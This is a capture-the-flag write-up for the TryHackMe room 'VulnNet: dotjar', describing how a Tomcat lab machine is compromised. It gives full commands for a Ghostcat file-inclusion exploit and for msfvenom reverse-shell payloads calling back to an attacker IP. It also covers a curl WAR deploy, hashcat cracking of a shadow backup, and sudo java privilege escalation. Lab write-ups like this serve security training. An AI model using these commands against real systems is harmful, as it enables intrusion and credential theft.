# VulnNet: dotjar

https://tryhackme.com/room/vulnnetdotjar

Oof, this room took a lot longer than it should have, I think. I really struggled with the initial foothold (not helped by the room saying it should have been easy, haha).

Recon showed two ports, `8009` and `8080`. On `8080` was a tomcat instance, so I immediately though of the war deploy hack, but the manager interface was protected by basic auth. I ran through a bunch of default creds for this, tried hitting it with hydra and even metasploit's enum function (I usually avoid metasploit just because its too magic), but no dice.

`8009` is the 'ajp' port, sort of a different protocol way to access the admin interface. A few resources I'd read only mentioned it insofar as you can use it to access tomcat if `8080` is blocked, which wasn't much use. Hmm. I figured it being exposed though, as one of only *two* ports, must be important.

An hour or so of banging my head, and I did a bit more research before stumbling onto [Ghostcat](https://www.securityweek.com/apache-tomcat-affected-serious-ghostcat-vulnerability) - a vulnerability in ajp that provides somewhat restricted but still potentially devastating local file inclusion. To test this, I hit up exploit db and found this python 2 script: https://www.exploit-db.com/exploits/48143

Grabbing this and running it as is (`python2 ghostcat.py 10.10.104.169`) pulled out the `WEB-INF/web.xml` file, which contained the following text:

```xml
<description>
     VulnNet Dev Regulations - mandatory

1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:

    <redacted>:<redacted>

GUI access is disabled for security reasons.

4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>
```

Great! I had creds... but these didn't work for the manager interface. They did work for the host-manager though, and thus went the next hour as I went down a dead end. Specifically, I tried following this guide: https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/, but couldn't get it to work. Turns out, it only works if a number of configurations have been made to, for example, allow tomcat to host from remote servers which didn't appear to be the case.

So I was stuck again... until I read the above more slowly. The GUI is disabled... but in my wanderings and enumeration of tomcats docs I found it had a ... text interface? basically a simplistic api. That is, /manager/html is the standard manager url, but */manager/text* performs basically the same purpose without a gui! Sure enough, by accessing /manager/text/list I got a list of deployed applications.

Ok, so back to using the standard war exploit, finally :)

- First I created a jsp-based reverse shell with msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.108.144 LPORT=4444 -f raw -o revshell.jar`
- Then I uploaded this using curl: `curl -u <redacted> --upload-file revshell.war http://10.10.104.169:8080/manager/text/deploy?path=/revshell`
- Finally, by starting a nc listener and navigating to `http://10.10.104.169:8080/revshell`

This got me onto the machine as 'web'.

From here it was somewhat easy. I ran linpeas, and found a backup file under backups I could read, `shadow-backup-alt.gz`. Unzipping this got me a copy of shadow with the hashes for `web` and the other user, `jdk-admin`. I put these through hashcat with rockyou and `-m 1800` and quickly got the jdk-admin password. In their home directory was the user flag.

To get to root, sudo -l revealed I could run java as root, specifically `/usr/bin/java -jar *.jar`. Easy. I created another revshell, with a subtly different payload: `msfvenom -p java/shell_reverse_tcp LHOST=10.10.108.144 LPORT=4445 -f raw -o revshell2.jar`, brought this onto the machine via a web server and wget, started a new listener and then ran the sudo command to get a root shell. Easy :) Note that msfvenom, with a java payload will emit a jar format by default.
